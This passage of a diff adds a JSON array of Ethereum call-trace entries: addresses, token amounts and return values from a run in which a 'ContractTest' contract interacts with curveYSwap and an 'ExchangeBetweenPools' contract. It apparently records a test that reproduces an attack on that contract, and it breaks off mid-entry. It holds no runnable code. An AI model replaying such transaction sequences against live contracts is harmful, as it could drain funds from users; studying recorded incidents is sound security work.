+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "31951343451222398754991 [3.195e22]"
+    },
+    {
+        "id": "6496",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "442096211614379858872543 [4.42e23]"
+    },
+    {
+        "id": "3312",
+        "args": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003d148a340c47c460b474173"
+    },
+    {
+        "id": "2569",
+        "args": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003d148a340c47c460b474173"
+    },
+    {
+        "id": "15172",
+        "args": "(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0x6B175474E89094C44Da98b954EedeAC495271d0F, 1304347360753391460608 [1.304e21], 1425467089982243776205052 [1.425e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000588c54"
+    },
+    {
+        "id": "509",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4773",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "31906",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1257894214344187980 [1.257e18]"
+    },
+    {
+        "id": "1315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "242347570202 [2.423e11]"
+    },
+    {
+        "id": "529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "242347570202 [2.423e11]"
+    },
+    {
+        "id": "6496",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "355746811772 [3.557e11]"
+    },
+    {
+        "id": "3312",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "2569",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "15172",
+        "args": "(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101112444 [2.101e9], 815523071572 [8.155e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000f951d4"
+    },
+    {
+        "id": "509",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "29076",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "7983010 [7.983e6]"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "1032264538 [1.032e9]"
+    },
+    {
+        "id": "803",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "15130",
+        "args": "(0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3780",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "31690",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1219188455269113215 [1.219e18]"
+    },
+    {
+        "id": "1185",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "85146961356411071020451 [8.514e22]"
+    },
+    {
+        "id": "486",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "85146961356411071020451 [8.514e22]"
+    },
+    {
+        "id": "6496",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "272770619034611513332400 [2.727e23]"
+    },
+    {
+        "id": "3312",
+        "args": "0x0000000000085d4780B73119b644AE5ecd22b376",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000004239e4ca4ca1c6f47d10376"
+    },
+    {
+        "id": "2569",
+        "args": "0x0000000000085d4780B73119b644AE5ecd22b376",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000004239e4ca4ca1c6f47d10376"
+    },
+    {
+        "id": "15130",
+        "args": "(0x73a052500105205d34Daf004eAb301916DA8190f, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "25892",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D], curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "25097",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D], curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "23767",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "22978",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "74910",
+        "args": "119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "242347570202 [2.423e11]"
+    },
+    {
+        "id": "529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "242347570202 [2.423e11]"
+    },
+    {
+        "id": "6496",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "355746811772 [3.557e11]"
+    },
+    {
+        "id": "3312",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "2569",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "15172",
+        "args": "(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101112444 [2.101e9], 815523071572 [8.155e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000f951d4"
+    },
+    {
+        "id": "509",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "5992",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "5197",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 119023523157 [1.19e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "361371093359 [3.613e11]"
+    },
+    {
+        "id": "529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "361371093359 [3.613e11]"
+    },
+    {
+        "id": "6496",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "355746811772 [3.557e11]"
+    },
+    {
+        "id": "3312",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "2569",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "15172",
+        "args": "(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101112444 [2.101e9], 815523071572 [8.155e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000f951d4"
+    },
+    {
+        "id": "509",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "89968",
+        "args": "5936509122330897689 [5.936e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "1032264538 [1.032e9]"
+    },
+    {
+        "id": "803",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "15130",
+        "args": "(0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3780",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "1032264538 [1.032e9]"
+    },
+    {
+        "id": "24801",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 47391215 [4.739e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "984873323 [9.848e8]"
+    },
+    {
+        "id": "803",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "15130",
+        "args": "(0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3780",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "1031",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51]",
+        "original_code": null,
+        "description": null,
+        "return_value": "47391215 [4.739e7]"
+    },
+    {
+        "id": "26801",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D], 47391215 [4.739e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1031",
+        "args": "ExchangeBetweenPools: [0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D]",
+        "original_code": null,
+        "description": null,
+        "return_value": "47391215 [4.739e7]"
+    },
+    {
+        "id": "11701",
+        "args": "0x21A3dbeE594a3419D6037D6D8Cee0B1E10Bf345C, 47391215 [4.739e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1031",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "71076010671 [7.107e10]"
+    },
+    {
+        "id": "440796",
+        "args": "2, 1, 71076010671 [7.107e10], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "35413",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1133529323263304087 [1.133e18]"
+    },
+    {
+        "id": "602",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "31951343451222398754991 [3.195e22]"
+    },
+    {
+        "id": "6496",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "442096211614379858872543 [4.42e23]"
+    },
+    {
+        "id": "3312",
+        "args": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003d148a340c47c460b474173"
+    },
+    {
+        "id": "2569",
+        "args": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003d148a340c47c460b474173"
+    },
+    {
+        "id": "15172",
+        "args": "(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0x6B175474E89094C44Da98b954EedeAC495271d0F, 1304347360753391460608 [1.304e21], 1425467089982243776205052 [1.425e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000588c54"
+    },
+    {
+        "id": "509",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4773",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "31906",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1257894214344724997 [1.257e18]"
+    },
+    {
+        "id": "1315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "361371093359 [3.613e11]"
+    },
+    {
+        "id": "529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "361371093359 [3.613e11]"
+    },
+    {
+        "id": "6496",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "355746811772 [3.557e11]"
+    },
+    {
+        "id": "3312",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "2569",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "15172",
+        "args": "(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101112444 [2.101e9], 815523071572 [8.155e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000f951d4"
+    },
+    {
+        "id": "509",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "29076",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "7983010 [7.983e6]"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "984873323 [9.848e8]"
+    },
+    {
+        "id": "803",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "15130",
+        "args": "(0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3780",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "31690",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1219188455269113215 [1.219e18]"
+    },
+    {
+        "id": "1185",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "85146961356411071020451 [8.514e22]"
+    },
+    {
+        "id": "486",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "85146961356411071020451 [8.514e22]"
+    },
+    {
+        "id": "6496",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "272770619034611513332400 [2.727e23]"
+    },
+    {
+        "id": "3312",
+        "args": "0x0000000000085d4780B73119b644AE5ecd22b376",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000004239e4ca4ca1c6f47d10376"
+    },
+    {
+        "id": "2569",
+        "args": "0x0000000000085d4780B73119b644AE5ecd22b376",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000004239e4ca4ca1c6f47d10376"
+    },
+    {
+        "id": "15130",
+        "args": "(0x73a052500105205d34Daf004eAb301916DA8190f, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0x73a052500105205d34Daf004eAb301916DA8190f",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "26830",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 71076010671 [7.107e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "24953",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 71076010671 [7.107e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "68308",
+        "args": "71076010671 [7.107e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "984873323 [9.848e8]"
+    },
+    {
+        "id": "803",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "15130",
+        "args": "(0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3780",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "5324",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 71076010671 [7.107e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1031",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "72060883994 [7.206e10]"
+    },
+    {
+        "id": "803",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "15130",
+        "args": "(0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
